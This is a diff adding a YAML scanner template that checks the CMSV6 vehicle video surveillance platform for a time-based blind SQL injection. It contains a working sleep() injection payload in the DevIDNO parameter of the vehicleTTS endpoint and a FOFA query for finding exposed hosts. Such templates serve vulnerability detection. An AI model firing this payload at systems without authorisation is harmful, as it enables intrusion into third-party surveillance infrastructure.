@@ -1,0 +1,29 @@
+id: poc-yaml-g-sky-cmsv6-sqli
+info:
+  name: 通天星CMSV6 车载视频监控平台 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: cmsv6
+  fofa: body="/808gps/"
+variables:
+  t1: random_int(5,10)
+  t2: t1 +1
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"808gps")
+- method: GET
+  path: /StandardApiAction_vehicleTTS.action?DevIDNO=5%27and(select*from(select+sleep({{.t1}}))a/**/union/**/select+1)=%27&Flag=4&Text=qwe
+  expression: 'status_code == 200 &&
+
+    contains(body,`{"result":19,"message":"Device does not exist!"}`) &&
+
+    contains(headers,"application/json") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
